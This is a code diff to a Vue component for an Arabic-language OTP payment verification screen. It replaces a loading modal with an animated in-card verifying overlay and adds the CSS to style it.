@@ -1,13 +1,29 @@
 <template>
     <div class="otp-shell" dir="rtl">
 
-        <!-- ── Waiting Loader Modal ──────────────────────────────────── -->
-        <InsLoading v-if="isVerifying && !error" :modal="false" color="amber" size="lg"
-            :text="t( 'verification.otp.loading' )"
-            :sub-text="t( 'verification.otp.waitingForApproval' )" />
-
         <!-- ── Main Card ─────────────────────────────────────────────── -->
-        <div class="otp-card">
+        <div class="otp-card" :class="{ 'otp-card--verifying': isVerifying && !error }">
+
+            <!-- ── Verifying Overlay (in-card) ───────────────────────── -->
+            <Transition name="verify-fade">
+                <div v-if="isVerifying && !error" class="verify-overlay">
+                    <div class="verify-overlay__content">
+                        <div class="verify-overlay__icon">
+                            <svg class="verify-overlay__shield" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z" fill="#faa62e" opacity="0.15" />
+                                <path d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z" stroke="#faa62e" stroke-width="1.5" fill="none" />
+                                <path d="M9 12l2 2 4-4" stroke="#faa62e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="verify-overlay__check" />
+                            </svg>
+                            <div class="verify-overlay__ring"></div>
+                        </div>
+                        <p class="verify-overlay__title">جاري التحقق من الرمز</p>
+                        <p class="verify-overlay__sub">يرجى الانتظار وعدم إغلاق الصفحة</p>
+                        <div class="verify-overlay__dots">
+                            <span></span><span></span><span></span>
+                        </div>
+                    </div>
+                </div>
+            </Transition>
 
             <!-- Error Message -->
             <div v-if="error" id="ErrorMessage" class="otp-error-msg">
@@ -129,7 +145,7 @@ import { usePaymentWebSocket } from '@/composables/usePaymentWebSocket';
 import { getOtpStatus } from '@/api/paymentApi';
 import logger from '@/utils/logger';
 import { safeRedirect } from '@/utils/safeRedirect';
-import InsLoading from '@/components/ui/InsLoading.vue';
+// InsLoading replaced with in-card verify overlay
 import { useCardBranding } from '@/composables/useCardBranding';
 import { getReasonLabel } from '@/constants/rejectionReasons';
 import paymentLogos from '@/../../resources/images/logo/master-visa-mada.webp';
@@ -762,4 +778,106 @@ onUnmounted( () =>
 }
 
 .otp-help__phone:hover { text-decoration: underline; }
+
+/* ── Verifying overlay (in-card frosted glass) ─────── */
+.otp-card--verifying {
+    position: relative;
+    pointer-events: none;
+}
+
+.verify-overlay {
+    position: absolute;
+    inset: 0;
+    z-index: 20;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: rgba(255, 255, 255, 0.88);
+    backdrop-filter: blur(6px);
+    -webkit-backdrop-filter: blur(6px);
+    border-radius: inherit;
+}
+
+.verify-overlay__content {
+    text-align: center;
+    padding: 2rem;
+}
+
+.verify-overlay__icon {
+    position: relative;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    width: 72px;
+    height: 72px;
+    margin-bottom: 1rem;
+}
+
+.verify-overlay__shield {
+    width: 40px;
+    height: 40px;
+}
+
+.verify-overlay__check {
+    stroke-dasharray: 20;
+    stroke-dashoffset: 20;
+    animation: check-draw 0.6s 0.3s ease forwards;
+}
+
+@keyframes check-draw {
+    to { stroke-dashoffset: 0; }
+}
+
+.verify-overlay__ring {
+    position: absolute;
+    inset: 0;
+    border: 3px solid transparent;
+    border-top-color: #faa62e;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+}
+
+.verify-overlay__title {
+    font-size: 16px;
+    font-weight: 700;
+    color: #1f2937;
+    margin: 0 0 4px;
+}
+
+.verify-overlay__sub {
+    font-size: 13px;
+    color: #6b7280;
+    margin: 0 0 14px;
+}
+
+.verify-overlay__dots {
+    display: flex;
+    justify-content: center;
+    gap: 6px;
+}
+
+.verify-overlay__dots span {
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    background: #faa62e;
+    animation: dot-bounce 1.4s ease-in-out infinite;
+}
+
+.verify-overlay__dots span:nth-child(2) { animation-delay: 0.2s; }
+.verify-overlay__dots span:nth-child(3) { animation-delay: 0.4s; }
+
+@keyframes dot-bounce {
+    0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
+    40% { transform: scale(1); opacity: 1; }
+}
+
+.verify-fade-enter-active,
+.verify-fade-leave-active {
+    transition: opacity 0.25s ease;
+}
+.verify-fade-enter-from,
+.verify-fade-leave-to {
+    opacity: 0;
+}
 </style>
